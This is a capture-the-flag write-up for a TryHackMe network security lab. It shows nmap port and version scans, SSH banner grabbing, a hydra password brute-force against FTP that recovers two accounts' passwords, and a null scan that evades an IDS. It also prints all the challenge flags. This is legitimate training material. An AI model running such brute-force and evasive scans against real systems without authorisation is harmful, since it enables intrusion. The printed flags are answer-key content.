# Net Sec Challenge

**Category:** Network Security

****Difficulty:**** medium

**Solver:** Simon

****Presentation:**** Use this challenge to test your mastery of the skills you have acquired 
in the Network Security module.

---

### Question 1:

What is the highest port number being open less than 10,000?

We have to run a simple `Nmap` scan with the flag `-p1-10000` to specify the port range

```bash
root@ip-10-80-121-101:~# nmap -sV 10.80.172.180 -p1-10000
Nmap scan report for 10.80.172.180
Host is up (0.0042s latency).
Not shown: 9995 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         (protocol 2.0)
80/tcp   open  http        lighttpd
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        Node.js (Express middleware)
```

The highest open port number is **8080**

### Question 2:

There is an open port outside the common 1000 ports; it is above 10,000. What is it?

We have to run the same `Nmap` scan while changing the port range to `-p1-65535` to scan every single ports.

```bash
root@ip-10-80-121-101:~# nmap -sV 10.80.172.180 -p1-65535
Nmap scan report for 10.80.172.180
Host is up (0.0019s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
80/tcp    open  http        lighttpd
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
8080/tcp  open  http        Node.js (Express middleware)
10021/tcp open  ftp         vsftpd 3.0.5
```

It's **10021**.

### Question 3:

How many TCP ports are open?

We can read on the previous scan that there is **6** TCP ports open.

### Question 4:

What is the flag hidden in the HTTP server header?

We have to scan with `Nmap` with the `-sV -sC`, `-sV` to list the service running on the specified port, and the `-sC` (Nmap scripting engine) can read the http-server-header.

```bash
root@ip-10-80-121-101:~# nmap -sV -sC 10.80.172.180 -p80
Nmap scan report for 10.80.172.180
Host is up (0.00039s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!
```

We have the flag printed: **THM{web_server_25352}**

### Question 5:

What is the flag hidden in the SSH server header?

Let's use `telnet` with the SSH port: **22**

```bash
root@ip-10-80-121-101:~# telnet 10.80.172.180 22
Trying 10.80.172.180...
Connected to 10.80.172.180.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 THM{946219583339} 
Connection closed by foreign host.
```

We have the flag printed: **THM{946219583339}**

### Question 6:

We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

We have the response in the question 2 `Nmap` scan:

```bash
root@ip-10-80-121-101:~# nmap -sV 10.80.172.180 -p1-65535
Nmap scan report for 10.80.172.180
Host is up (0.0019s latency).
Not shown: 65529 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh (protocol 2.0)
80/tcp open http lighttpd
139/tcp open netbios-ssn Samba smbd 4.6.2
445/tcp open netbios-ssn Samba smbd 4.6.2
8080/tcp open http Node.js (Express middleware)
10021/tcp open ftp vsftpd 3.0.5
```


We can see an FTP server listening on 10021 port, and with the `-sV` flag we have the version of this server: **vsftpd 3.0.5**

### Question 7:

We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?

Let's run hydra with both the username, on TryHackMe, we have a password dictionnary stored in `/usr/share/wordlists/rockyou.txt`.

```bash
root@ip-10-80-121-101:~# hydra -vV -l eddie -P /usr/share/wordlists/rockyou.txt 10.80.172.180 ftp
[100021][ftp] host: 10.80.172.180  login: eddie  password: jordan


root@ip-10-80-121-101:~# hydra -vV -l quinn -P /usr/share/wordlists/rockyou.txt 10.80.172.180 ftp
[100021][ftp] host: 10.80.172.180  login: quinn  password: andrea
```

Now let's connect to each via ftp and inspect their files.

**eddie:**

```bash
root@ip-10-80-121-101:~# ftp 10.80.172.180 10021
Connected to 10.80.172.180.
220 (vsFTPd 3.0.5)
Name (10.80.172.180:root): eddie
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 Sep 20  2021 .
drwxr-xr-x    3 1001     1001         4096 Sep 20  2021 ..
-rw-r--r--    1 1001     1001          220 Sep 14  2021 .bash_logout
-rw-r--r--    1 1001     1001         3771 Sep 14  2021 .bashrc
drwx------    2 1001     1001         4096 Sep 20  2021 .cache
-rw-r--r--    1 1001     1001          807 Sep 14  2021 .profile
226 Directory send OK.
```

There is nothing here, lets now check for **quinn**

```bash
root@ip-10-80-121-101:~# ftp 10.80.172.180 10021
Connected to 10.80.172.180.
220 (vsFTPd 3.0.5)
Name (10.80.172.180:root): quinn
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Sep 20  2021 .
drwxr-xr-x    2 1002     1002         4096 Sep 20  2021 ..
-rw-r--r--    1 1002     1002          220 Sep 14  2021 .bash_logout
-rw-r--r--    1 1002     1002         3771 Sep 14  2021 .bashrc
-rw-r--r--    1 1002     1002          807 Sep 14  2021 .profile
-rw-------    1 1002     1002          723 Sep 20  2021 .viminfo
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (20.9513 kB/s)
ftp> exit
```

We found a file ftp_flag.txt, let's use `get` to get it on our computer and print it.

```bash
root@ip-10-80-121-101:~# cat ftp_flag.txt 
THM{321452667098}
```

### Question 8:

Browsing to `http://10.80.172.180:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?

Once on the website we have this message:"Your mission is to use Nmap to scan 10.80.172.180 (this machine)as covertly as possible and avoid being detected by the IDS."

We use a `-sN` flag, it's a null scan where no TCP flag are in the packet.

```bash
root@ip-10-80-121-101:~# nmap -sN 10.80.172.180
```

After running the `Nmap` scan, we go back to the website and have the flag printed.

 "Exercise Complete! Task answer: THM{f7443f99}"
